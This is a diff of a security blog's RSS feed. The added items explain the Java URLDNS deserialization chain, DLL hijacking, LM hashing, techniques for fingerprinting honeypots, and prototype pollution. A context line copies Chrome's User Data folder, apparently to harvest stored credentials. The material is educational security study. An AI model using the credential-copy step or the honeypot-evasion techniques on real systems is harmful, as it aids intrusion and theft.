@@ -4,10 +4,119 @@
     <title>Posts on h4xk0r blog</title>
     <link>http://localhost:1313/posts/</link>
     <description>Recent content in Posts on h4xk0r blog</description>
-    <generator>Hugo -- 0.155.1</generator>
-    <language>zh-cn</language>
-    <lastBuildDate>Sat, 13 Jun 2026 10:46:13 +0800</lastBuildDate>
+    <generator>Hugo -- 0.167.0</generator>
+    <language>zh-CN</language>
+    <lastBuildDate>Wed, 07 Oct 2026 12:54:57 +0800</lastBuildDate>
     <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>反序列化链(URLDNS)</title>
+      <link>http://localhost:1313/posts/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BEurldns/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link>
+      <pubDate>Wed, 07 Oct 2026 12:54:57 +0800</pubDate>
+      <guid>http://localhost:1313/posts/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BEurldns/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</guid>
+      <description>&lt;p&gt;该链使用Java内置类. 所有有几个特性:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;不依赖第三方&lt;/li&gt;
+&lt;li&gt;不限制 JDK 版本&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;又因为该链只能触发 DNS 请求所以常用来探测是否存在反序列化漏洞.&lt;/p&gt;
+&lt;h3 id=&#34;分析&#34;&gt;分析&lt;/h3&gt;
+&lt;p&gt;漏洞的利用链条在yso中是这样写的&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;*   Gadget Chain:
+*     HashMap.readObject()
+*       HashMap.putVal()
+*         HashMap.hash()
+*           URL.hashCode()
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;找到&lt;code&gt;src/main/java/ysoserial/payloads/URLDNS.java&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;./image-20261001111021416.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;注意到&lt;code&gt;HashMap &lt;/code&gt;的put方法接收一个域名. 跟进 put 方法,&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;./image-20261001110938012.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;调用了&lt;code&gt;putVal&lt;/code&gt;. 并对第一个参数调用了 hash 方法,继续跟进&lt;code&gt;hash()&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20261007130420326&#34; loading=&#34;lazy&#34; src=&#34;./image-20261007130420326.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;判断接收的&lt;code&gt;Key&lt;/code&gt;是否为 null , 否的话调用key的&lt;code&gt;hashcode&lt;/code&gt;方法.&lt;/p&gt;
+&lt;p&gt;注意: 如果这里接收的值是 url 的话,就会调用 url 的&lt;code&gt;hashcode&lt;/code&gt;方法,写一个demo来看URL中的&lt;code&gt;hashcode&lt;/code&gt;方法&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Main&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(String&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; args) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        URL url  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;;	
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;进入URL,查看 &lt;code&gt;hashcode()&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20261007130446203&#34; loading=&#34;lazy&#34; src=&#34;./image-20261007130446203.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;判断不等于&lt;code&gt;-1&lt;/code&gt;, 因为这里默认值是等于&lt;code&gt;-1&lt;/code&gt;的,所以执行&lt;code&gt;handler.hashcode&lt;/code&gt;,跟进一下&lt;code&gt;URLStreamHeadler&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20261007130502419&#34; loading=&#34;lazy&#34; src=&#34;./image-20261007130502419.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;继续跟进&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20261007130510902&#34; loading=&#34;lazy&#34; src=&#34;./image-20261007130510902.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现是调用的&lt;code&gt;getHostAddress() &lt;/code&gt;获取域名的IP地址.也就是说会进行DNS解析. 也就可以通过是否接收到DNS来验证是否存在反序列化&lt;/p&gt;
+&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;
+&lt;p&gt;HashMap 在反序列化、重新计算 key 的 hash 时，如果 key 是 URL，就会调用 &lt;code&gt;URL.hashCode()&lt;/code&gt;；URL 的 hash 计算过程中会获取主机地址，从而可能触发 DNS 查询。&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>浅析dll和com劫持</title>
+      <link>http://localhost:1313/posts/%E6%B5%85%E6%9E%90dll%E5%92%8Ccom%E5%8A%AB%E6%8C%81/</link>
+      <pubDate>Sat, 18 Jul 2026 19:45:13 +0800</pubDate>
+      <guid>http://localhost:1313/posts/%E6%B5%85%E6%9E%90dll%E5%92%8Ccom%E5%8A%AB%E6%8C%81/</guid>
+      <description>&lt;h2 id=&#34;dll&#34;&gt;DLL&lt;/h2&gt;
+&lt;p&gt;dll: 动态链接库文件,用于给程序调用&lt;/p&gt;
+&lt;p&gt;DLL加载的搜索过程:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;程序所在目录&lt;/li&gt;
+&lt;li&gt;程序加载目录(通过SetCurrentDictory API)&lt;/li&gt;
+&lt;li&gt;系统目录(system32或system)&lt;/li&gt;
+&lt;li&gt;windows目录&lt;/li&gt;
+&lt;li&gt;Path环境变量目录&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Windows系统 通过&amp;quot;DLL的加载搜索顺序&amp;quot;和&amp;quot;Know DLLs注册表项&amp;quot; 的机制来确定应用调用dll的路径,之后进行加载并执行&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Know dlls : 是已经被windows操作系统加载后的Dll,不会被程序使用.&lt;/p&gt;
+&lt;h3 id=&#34;dllmain&#34;&gt;DLLMain&lt;/h3&gt;
+&lt;p&gt;和程序的Main函数一样,dll也有入口函数&lt;code&gt;DllMain&lt;/code&gt; 当程序加载dll的时候则会调用dllMain&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 原型:
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BOOL WINAPI &lt;span style=&#34;color:#a6e22e&#34;&gt;DllMain&lt;/span&gt;(
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    HMODULE hModule,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    DWORD  dwReason,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    LPVOID lpReserved
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 完整
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BOOL WINAPI &lt;span style=&#34;color:#a6e22e&#34;&gt;DllMain&lt;/span&gt;(
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    HINSTANCE hinstDLL,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    DWORD fdwReason,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    LPVOID lpvReserved
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;实现dll劫持&#34;&gt;实现DLL劫持&lt;/h3&gt;
+&lt;p&gt;Dllmain 中的&lt;code&gt;dwReason&lt;/code&gt;参数表示调用的原因&lt;/p&gt;
+&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;载入状态&lt;/th&gt;
+					&lt;th style=&#34;text-align: center&#34;&gt;值&lt;/th&gt;
+					&lt;th&gt;说明&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;DLL_PROCESS_ATTACH&lt;/td&gt;
+					&lt;td style=&#34;text-align: center&#34;&gt;1&lt;/td&gt;
+					&lt;td&gt;DLL第一次被加载到进程时&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;DLL_PROCESS_DETACH&lt;/td&gt;
+					&lt;td style=&#34;text-align: center&#34;&gt;0&lt;/td&gt;
+					&lt;td&gt;DLL从进程卸载&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;DLL_THREAD_ATTACH&lt;/td&gt;
+					&lt;td style=&#34;text-align: center&#34;&gt;2&lt;/td&gt;
+					&lt;td&gt;进程创建新线程&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;DLL_THREAD_DETACH&lt;/td&gt;
+					&lt;td style=&#34;text-align: center&#34;&gt;3&lt;/td&gt;
+					&lt;td&gt;线程结束&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;通常用来判断状态来做一些操作,demo:&lt;/p&gt;</description>
+    </item>
     <item>
       <title>LM,NTMLv1&amp;v2</title>
       <link>http://localhost:1313/posts/lmntmlv1v2/</link>
@@ -70,7 +179,19 @@ key2:
 最后转换成16进制后就是   --&amp;gt; 01 01 01 01 01 01 01 01
 &lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;字符串(KGS!@#$%)加密&lt;/p&gt;</description>
+&lt;p&gt;字符串(KGS!@#$%)加密&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;固定明文 =  &amp;#34;KGS!@#$%&amp;#34;  --&amp;gt; 16进制 = 4B 47 53 21 40 23 24 25
+cipher1 = DES(key1, &amp;#34;KGS!@#$%&amp;#34;)
+cipher2 = DES(key2, &amp;#34;KGS!@#$%&amp;#34;)
+
+
+cipher1 = B98A94DFC14F1E59
+cipher2 = AAD3B435B51404EE  用固定密钥去加密固定明文 结果永远相同,为此值时说明密码值不超过7位
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;拼接输出到SAM(LM Hash)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;</description>
     </item>
     <item>
       <title>Bucket Attack and Defense</title>
@@ -185,7 +306,78 @@ Linux 路径：
 &lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;&lt;strong&gt;3.1 协议的返回特征&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;部分开源蜜罐在模拟各个协议时，会在响应中带有一些明显的特征，可以根据这些特征来检测蜜罐。&lt;/p&gt;</description>
+&lt;p&gt;部分开源蜜罐在模拟各个协议时，会在响应中带有一些明显的特征，可以根据这些特征来检测蜜罐。&lt;/p&gt;
+&lt;p&gt;拿Dionaea 的Memcached协议举例，在实现Memcached协议时Dionaea把很多参数做了随机化，但是在一些参数如：version、libevent和rusage_user等都是固定的。&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/honeypot-anti-takeover/t01d643100e1d3e6607.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以通过组合查询其固定参数来确定蜜罐，其他蜜罐在协议上的特征如表3-1所示。&lt;/p&gt;
+&lt;p&gt;表3-1 协议响应特征的蜜罐&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;图片&#34; loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/honeypot-anti-takeover/t01ca7e1b030f1ef6fc.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;32-协议实现的缺陷&#34;&gt;&lt;strong&gt;3.2 协议实现的缺陷&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;在部分开源的蜜罐中模拟实现部分协议并不完善，我们可以通过发送一些特定的请求包获得的响应来判断是否为蜜罐。&lt;/p&gt;
+&lt;h4 id=&#34;321-ssh协议&#34;&gt;&lt;strong&gt;3.2.1 SSH协议&lt;/strong&gt;&lt;/h4&gt;
+&lt;p&gt;SSH协议（Secure Shell）是一种加密的网络传输协议，最常用的是作为远程登录使用。SSH服务端与客户端建立连接时需要经历五个步骤：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;协商版本号阶段。&lt;/li&gt;
+&lt;li&gt;协商密钥算法阶段。&lt;/li&gt;
+&lt;li&gt;认证阶段。&lt;/li&gt;
+&lt;li&gt;会话请求阶段。&lt;/li&gt;
+&lt;li&gt;交互会话阶段。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;SSH蜜罐在模拟该协议时同样要实现这五个步骤。Kippo 是一个已经停止更新的经典的SSH蜜罐，使用了twisted来模拟SSH协议。在kippo的最新版本中使用的是很老的twistd 15.1.0版本。该版本有个明显的特征。在版本号交互阶段需要客户端的SSH版本为形如SSH-主版本-次版本 软件版本号，当版本号为不支持的版本时，如SSH-1.9-OpenSSH_5.9p1就会报错“bad version 1.9”并且断开连接。通过Kippo的配置来看，仅仅支持SSH-2.0-X和SSH-1.99-X两个主版本，其他主版本都会产生报错。&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/honeypot-anti-takeover/t014c7a1715c2468723.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;图片&#34; loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/honeypot-anti-takeover/t018720f9609d1964b2.png&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;322-mysql协议&#34;&gt;&lt;strong&gt;3.2.2 Mysql协议&lt;/strong&gt;&lt;/h4&gt;
+&lt;p&gt;部分Mysql蜜罐会通过构造一个恶意的mysql服务器，攻击者通过连接恶意的mysql服务器后发送一个查询请求，恶意的mysql服务器将会读取到攻击者指定的文件。&lt;/p&gt;
+&lt;p&gt;最早的如*&lt;strong&gt;&lt;a href=&#34;https://github.com/Gifts/Rogue-MySql-Server&#34;&gt;https://github.com/Gifts/Rogue-MySql-Server&lt;/a&gt;*&lt;/strong&gt;，可以伪造一个恶意的mysql服务器,并使用mysql客户端连接，如下图可见恶意的mysql服务器端已经成功读取到了客户端的/etc/password内容。&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;图片&#34; loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/honeypot-anti-takeover/t015ae90309e6d4fb15.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;检测此类蜜罐的步骤可分为如下几步：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;伪造客户端连接蜜罐mysql服务&lt;/li&gt;
+&lt;li&gt;连接成功发送mysql查询请求&lt;/li&gt;
+&lt;li&gt;接受mysql服务器响应，通过分析伪造的mysql客户端读取文件的数据包得到的报文结构：文件名长度+1 + \x00\x00\x01\xfb + 文件名&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img alt=&#34;图片&#34; loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/honeypot-anti-takeover/t015e946de574d91a18.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;那么我们就可以通过socket构造对应的流程即可识别伪造的mysql服务器，并抓取读取的文件名。&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;图片&#34; loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/honeypot-anti-takeover/640.webp&#34;&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;/h4&gt;
+&lt;h4 id=&#34;323--telnet协议&#34;&gt;&lt;strong&gt;3.2.3  Telnet协议&lt;/strong&gt;&lt;/h4&gt;
+&lt;p&gt;HFish蜜罐中实现了Telnet协议，默认监听在23端口。模拟的该协议默认无需验证，并且对各个命令的结果都做了响应的模板来做应答。在命令为空或者直接回车换行时，会响应default模板，该模板内容为test。因此可以利用这个特征进行该蜜罐在telnet服务上的检测如图所示。&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;图片&#34; loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/honeypot-anti-takeover/t01d39a8654325cc8f4.png&#34;&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;/h3&gt;
+&lt;h3 id=&#34;33-明显的web的特征&#34;&gt;&lt;strong&gt;3.3 明显的WEB的特征&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;部分开源蜜罐提供了web服务，这些web服务中常常会带有一些明显的特征，可以根据这些特征来检测蜜罐。如特定的js文件、build_hash或者版本号等。&lt;/p&gt;
+&lt;p&gt;还是拿HFish举例。HFish在默认8080端口实现了一个WordPress登录页面，页面中由一个名为x.js的javascript文件用来记录尝试爆破的登录名密码。直接通过判断wordpress登录页是否存在x.js文件就可判断是否为蜜罐。&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;图片&#34; loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/honeypot-anti-takeover/t01fad85f4dca4fcd32.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;还有glastopf蜜罐，其没做任何伪装是最明显的。可以通过页面最下方的blog comments的输入框进行识别。&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;图片&#34; loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/honeypot-anti-takeover/t012afd3552a077ad97.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;其他的常见的开源蜜罐在WEB上的特征如下表所示。&lt;/p&gt;
+&lt;p&gt;表3-2 具有明显WEB特征的蜜罐&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;图片&#34; loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/honeypot-anti-takeover/t012977e98a9aa63645.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;34-上下文特征&#34;&gt;&lt;strong&gt;3.4 上下文特征&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;部分开源蜜罐存在命令执行上下文明显的特征，本节以Cowrie和HFish为例。&lt;/p&gt;
+&lt;p&gt;2020年6月份研究人员发现Mirai的新变种Aisuru检测可以根据执行命令的上下文检测到Cowrie开源蜜罐。当满足如下三个条件时Aisuru将会判定为蜜罐：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;设备名称为localhost。&lt;/li&gt;
+&lt;li&gt;设备中所有进程启动于6月22日或6月23日。&lt;/li&gt;
+&lt;li&gt;存在用户名richard。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img alt=&#34;图片&#34; loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/honeypot-anti-takeover/t015e3823db9a9278d7.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;查看Cowrie源码在默认配置中执行ps命令，发现进程的启动时间都在6月22或6月23。不过在最新版的Cowrie中richard被phil替换，并且主机名由localhost替换为svr04。&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;图片&#34; loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/honeypot-anti-takeover/t0111e563f10df4d9cb.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;由Aisuru的启发，是可以根据一些特定的上下文来检测蜜罐的。比如最新版的Cowrie，在默认配置下一些一些命令得到的结果是固定不变的。如：cat /proc/meminfo 这个命令无论执行多少次得到的内容都是不变的，而这真实的系统中是不可能的。&lt;/p&gt;
+&lt;p&gt;再说HFish蜜罐，HFish同样也实现了SSH协议，默认监听在22端口。该蜜罐的SSH协议同样可以很容易的通过上下文识别出来。和telnet协议一样SSH协议在直接进行回车换行时会默认执行default输出test。&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;图片&#34; loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/honeypot-anti-takeover/t01d39a8654325cc8f4.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;35-fuzz-testing-特征&#34;&gt;&lt;strong&gt;3.5 Fuzz testing 特征&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;Fuzz testing（模糊测试）本是一种安全测试的方法，通过产生随机的数据输入测试系统查看系统响应或者状态，以此发现潜在的安全漏洞。部分蜜罐借用Fuzz testing的思想实现了蜜罐系统，通过360 Netlab的 zom3y3大哥在《通过Anglerfish蜜罐发现未知的恶意软件威胁》中对Fuzz testing蜜罐的介绍，我们得知有以下几点特征：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;响应任意端口的TCP SYN Packet。&lt;/li&gt;
+&lt;li&gt;根据协议特征，永远返回正确的响应。&lt;/li&gt;
+&lt;li&gt;返回预定义或者随机的Payload特征库集合。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img alt=&#34;图片&#34; loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/honeypot-anti-takeover/t01b9cd99d83226a3b5.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;该蜜罐很容易通过人工判断，其目的为模拟蜜罐fuzzing特征，通过预定义大量的关键字实现对扫描器的干扰。该类蜜罐可以通过跨服务的特征进行判断，如开放了HTTP服务同时响应了upnp协议，或者根据server的长度或者个数来判断。由于未知哪种蜜罐产品提供的这个蜜罐服务，quake将此蜜罐标记为未知蜜罐，可以使用语法app:&amp;ldquo;未知蜜罐&amp;quot;搜索。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;</description>
     </item>
     <item>
       <title>Yso</title>
@@ -309,6 +501,73 @@ xcopy &amp;#34;%LOCALAPPDATA%\Google\Chrome\User Data&amp;#34; &amp;#34;%LOCALAP
 &lt;p&gt;&lt;strong&gt;Pod&lt;/strong&gt;&lt;/p&gt;</description>
     </item>
     <item>
+      <title>原型链污染</title>
+      <link>http://localhost:1313/posts/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</link>
+      <pubDate>Mon, 30 Mar 2026 21:28:24 +0800</pubDate>
+      <guid>http://localhost:1313/posts/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</guid>
+      <description>&lt;h2 id=&#34;prototype与__proto__&#34;&gt;&lt;code&gt;prototype&lt;/code&gt;与&lt;code&gt;__proto__&lt;/code&gt;&lt;/h2&gt;
+&lt;h3 id=&#34;prototype-显式原型&#34;&gt;&lt;code&gt;prototype&lt;/code&gt; 显式原型&lt;/h3&gt;
+&lt;p&gt;JavaScript中有一个特殊的地方就是&lt;u&gt;函数也是对象&lt;/u&gt;,对象可以放属性,而函数一样可以放属性,&lt;code&gt;prototype&lt;/code&gt;就是函数的一个属性&lt;/p&gt;
+&lt;p&gt;例子:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Person&lt;/span&gt;(){}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;Person&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;prototype&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//当创建一个函数的时候,会自动创建 Person.prototype,就像Person.name等属性一样
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;prototpye的内容是&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;constructor&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Person&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;结果是&lt;/span&gt;{}, &lt;span style=&#34;color:#a6e22e&#34;&gt;因为默认不可枚举&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;new-的实际过程&#34;&gt;new 的实际过程&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Person&lt;/span&gt;(){}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Person&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;创建对象&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;：&lt;/span&gt;
